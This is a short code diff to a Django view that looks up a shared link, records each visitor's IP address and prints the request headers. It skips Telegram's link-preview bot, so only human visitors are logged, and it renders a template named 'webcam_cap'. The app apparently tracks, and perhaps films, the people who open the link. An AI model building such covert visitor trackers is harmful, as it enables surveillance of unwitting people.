@@ -5,13 +5,21 @@ from api.models import Uri_link
 def index(request, g_link):
     try:
         url_db = Uri_link.objects.get(url=g_link)
+        print(f"{url_db=}")
+        print(f"{request.headers=}")
         x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
         if x_forwarded_for:
             ip = x_forwarded_for.split(',')[0]
         else:
             ip = request.META.get('REMOTE_ADDR')
+        print(f"{ip=}")
 
-        if ip not in url_db.get_ips:
+        if url_db.get_ips is None and request.headers['User-Agent'].startswith("TelegramBot"):
+            print("Robot!")
+        elif url_db.get_ips is None:
+            url_db.get_ips = [ip]
+            url_db.save()
+        elif ip not in url_db.get_ips:
             url_db.get_ips.append(ip)
             url_db.save()
         return render(request, 'webcam_cap/index.html', {'name':url_db.name })
